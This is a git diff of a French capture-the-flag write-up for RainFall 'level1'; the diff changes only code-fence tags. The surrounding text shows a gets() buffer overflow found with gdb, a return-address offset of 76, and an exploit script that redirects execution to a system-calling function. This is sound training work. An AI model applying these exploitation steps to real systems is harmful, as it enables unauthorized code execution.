@@ -1,6 +1,6 @@
 Nous utilisons objdump pour avoir un aperçu du binaire level1 :
 
-```
+```sh
 level1@RainFall:~$ objdump ./level1 -d
 ```
 
@@ -81,7 +81,7 @@ Disassembly of section .plt:
 
 La fonction **run** est intéressante, il y a un appel à **gets** dans main, qui est vulnérable à une attaque buffer overflow. Nous allons donc essayer de modifier l'adresse de retour pour accéder à la fonction **run** qui appelle **system**. Tout d'abord, nous vérifions si level1 est vulnérable à une attaque par buffer overflow :
 
-```
+```sh
 level1@RainFall:~$ checksec --file ./level1 
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level1
@@ -89,13 +89,13 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 
 Aucun canary trouvé, donc nous pouvons exploiter la vulnérabilité avec un buffer oveflow. D'abord, nous allons trouver l'offset du buffer, puis créer payload.
 
-```
+```sh
 level1@RainFall:~$ python /tmp/pattern.py
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 ```
 Ensuite, nous tentons de modifier l'EIP dans **main** avec l'adresse de la fonction **run**.
 
-```
+```sh
 level1@RainFall:~$ gdb -q ./level1
 Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
 (gdb) b main
@@ -151,13 +151,13 @@ Program received signal SIGSEGV, Segmentation fault.
 Nous avons un segfault à l'adresse ```0x63413563``` et la commande info frame nous donne: **saved eip 0x63413563**
 Ainsi, nous savons que eip a été écrasé par cette valeur : ```0x63413563``` Nous allons vérifier la position de cette valeur dans notre pattern en utilisant notre script:
 
-```
+```sh
 level1@RainFall:~$ python /tmp/pattern.py > /tmp/pattern
 level1@RainFall:~$ python /tmp/pattern.py /tmp/pattern 0x63413563
 offset found at: 76
 ```
 On exploit avec le script:
-```
+```sh
 level1@RainFall:~$ python /tmp/exploit.py 0x08048444 76
 crafting payload...
 done:
@@ -175,7 +175,7 @@ Flag!
 
 Nous avons vu que la limite est de 76 octets, nous pouvons également procéder manuellement en identifiant l'adresse de **eip** et en soustrayant l'adresse de début du buffer. Nous savons, d'après le code désassemblé, que 0x50 octets sont réservés, donc le buffer fait 0x50 - 0x10, soit 64 octets.
 
-```
+```sh
 level1@RainFall:~$ gdb -q ./level1 
 Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
 (gdb) b main
